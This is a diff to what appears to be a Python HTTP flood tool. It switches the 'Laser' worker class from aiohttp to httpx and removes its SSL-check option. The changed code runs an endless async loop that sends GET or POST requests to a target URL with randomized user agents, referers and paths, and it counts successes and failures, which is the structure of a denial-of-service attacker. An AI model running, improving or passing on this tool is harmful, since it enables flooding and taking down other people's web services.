@@ -1,11 +1,11 @@
 import random
-import aiohttp
+import httpx
 import asyncio
 import logging
 from multiprocessing import Process, Manager
 from urllib.parse import urlparse
 
-logging.basicConfig(level = logging.INFO,format = '%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level = logging.INFO,format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 try:
@@ -19,6 +19,7 @@ except:
 METHOD_GET = 'get'
 METHOD_POST = 'post'
 METHOD_RAND = 'random'
+TIMEOUT = 0.1
 
 USER_AGENT_PARTS = {
     'os': {
@@ -72,7 +73,7 @@ class Laser(Process):
     url = None
     host = None
     port = 80
-    ssl = False
+    
     referers = []
     useragents = []
     method = METHOD_GET
@@ -83,7 +84,7 @@ class Laser(Process):
 
     # Options
 
-    def __init__(self, url, coros, counter, agents=None, no_payload=False, sslcheck=True, debug=False):
+    def __init__(self, url, coros, counter, agents=None, no_payload=False, debug=False):
 
         super(Laser, self).__init__()
 
@@ -96,7 +97,7 @@ class Laser(Process):
         self.host = self.url
         self.agents = agents
         self.loop = asyncio.get_event_loop()
-        self.sslcheck = sslcheck
+        
         self.no_payload = no_payload
         
         self.referers = [
@@ -170,7 +171,7 @@ class Laser(Process):
         logger.debug(f"Worker {self.name} completed run. Sleeping...")
 
     async def task(self):
-        async with aiohttp.ClientSession() as sess:
+        async with httpx.AsyncClient() as sess:
 
             while self.runnable:
 
@@ -178,11 +179,18 @@ class Laser(Process):
                     (path, headers) = self.createPayload()
                     method = self.get_method().upper()
                     url = f'{self.url}{path}'
+                    
+                    
                     if self.no_payload:
+                        
                         await sess.request(method, url)
                     else:
-                        await sess.request(method, url, headers=headers, verify_ssl=self.sslcheck)
 
+                        await sess.request(method, url, headers=headers)
+                        #await sess.request(method, url, headers=headers, timeout=TIMEOUT, verify_ssl=self.sslcheck)
+                    
+                    
+                    
                     self.incCounter()
                 except:
                     self.incFailed()
